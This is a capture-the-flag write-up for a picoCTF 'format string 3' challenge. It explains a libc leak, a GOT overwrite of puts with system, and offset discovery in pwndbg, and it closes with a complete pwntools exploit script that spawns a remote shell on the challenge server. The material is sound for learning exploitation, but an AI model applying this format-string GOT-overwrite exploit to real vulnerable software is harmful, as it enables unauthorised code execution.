# format string 3
This challenge is similar to format string 2 but here we want to overwrite the puts function call to a system call so we end up calling `system("/bin/sh")` which will allow us to get a shell to `cat flag.txt`.

We are given 4 files. The source code, the binary, a linker, and a lib file.

EDIT: To actually run we need to make both the binary and the linker executable!! 

Starting with the source code we can see that firstly:
```
void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}
```

This part of the code calls setvbuf to put it on GOT, which the author nicely gives us the address of in:

```
void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}
```

The next thing that we should understand is that we as users have complete control over the input to `printf`, where the input is directly used as an argument:

```
fgets(buf, 1024, stdin);	
printf(buf);
```

This lets us do a format string exploit which we can then use in:

```
puts(normal_string); # normal_string = "/bin/sh"
```

If we can just overwrite `puts` in the GOT to `system` we will call `system("bin/sh")` which will give us a shell where we can then get the flag.

From this, the new thing compared to previous string exploit challenges is that we now have to is to change the address of `puts` to `system`. How is this done? By a GOT overwrite.

The first thing we have to do is to find the libc address on the remote server which we do by using the fact that we were given the same libc file and that we know where setvbuf is on the remote server.

This is achieved by (using pwntools):
```
bytes_setvbuf_address = p.recvline()

setvbuf_leak = int(bytes_setvbuf_address.split(b"x")[1].strip(), 16) # get the integer value of the address

print("bytes setvbuf address", hex(setvbuf_leak))

libc = ELF("./libc.so.6")

# find the libc base address on remote by calculating it with the same libc
libc.address = setvbuf_leak - libc.symbols["setvbuf"]
```

Once the libc address is set we can get can see all the address:
```
print("libc address:", hex(libc.address)) # 0x7e9340f13000
print("puts:", hex(e.got.puts))			  # 0x404018
print("system", hex(libc.symbols.system)) # 0x7e9340f62760
```

This means that we want to overwrite `0x404018` with `0x7e9340f62760`.

The last thing we have to do is find the offset from the `puts` function call and where our input ends up on the stack.
We do this by using pwndbg and debugging the binary.
I achieved this by:
1. `gdb ./vuln`
2. `b puts`
3. `r`
4. `input AAAAAAAA` into the program
5. Once we stop: `stack 50` and look of the line numbers (in hex) difference which for me happened to be `0x21` or 33 in decimal.
6. Now, in 64 bit systems there is an addition in printf where we will print a bunch of values before we start printing the stack. We learned this in format string 2. They are `rsi, rdx, rcx, r8, r9`. This means we have to add to 5 to our offset, leading to a real offset of 38 in decimal.

From that we can now construct the payload and send it to the server using pwntools:
```
OFFSET = int("0x21", 16) + 5
print("OFFSET:", OFFSET)

payload = fmtstr_payload(OFFSET, {e.got.puts : libc.symbols.system})
print(payload)

p.sendline(payload)

p.interactive()
```

Once we run this we get a shell where we can `cat flag.txt` to get the flag.

Full code:
```
from pwn import *

host = "rhea.picoctf.net"
port = 59266

context.binary = e = ELF("./vuln")


p = remote(host, port)


# find the libc position
info(p.recvline())
info(p.recvuntil("libc: "))

bytes_setvbuf_address = p.recvline()

setvbuf_leak = int(bytes_setvbuf_address.split(b"x")[1].strip(), 16)

libc = ELF("./libc.so.6")

# find the libc base address on remote by calculating it with the same libc
libc.address = setvbuf_leak - libc.symbols["setvbuf"]

print("libc address:", hex(libc.address))
print("puts:", hex(e.got.puts))
print("system", hex(libc.symbols.system))

# we find the offset manually by using pwndbg through the steps:
# 1. gdb ./vuln
# 2. b puts
# 3. r
# 4. input AAAAAAAA into the input
# 5. stack 50 and look at the value from 00 in hex to 21 in hex
OFFSET = int("0x21", 16) + 5
print("OFFSET:", OFFSET)


payload = fmtstr_payload(OFFSET, {e.got.puts : libc.symbols.system})
print(payload)

p.sendline(payload)

p.interactive()
```

This linked helped a lot: https://blog.nviso.eu/2024/05/23/format-string-exploitation-a-hands-on-exploration-for-linux/